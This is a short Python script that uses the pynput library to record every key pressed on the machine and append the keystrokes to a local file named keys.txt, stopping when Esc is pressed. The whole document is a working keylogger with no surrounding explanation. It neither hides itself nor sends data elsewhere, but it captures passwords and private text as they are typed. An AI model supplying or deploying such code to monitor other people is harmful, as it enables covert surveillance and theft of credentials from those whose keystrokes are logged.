from pynput.keyboard import Key, Listener

file_dest = "keys.txt"

def on_press(key):
    with open(file=file_dest, mode="a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            match key:
                case Key.space:
                    f.write(" ")
                case Key.enter:
                    f.write("\n")
                case _:
                    if key != Key.esc:
                        f.write(f" ([{str(key).split(".")[1].upper()}]) ")
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()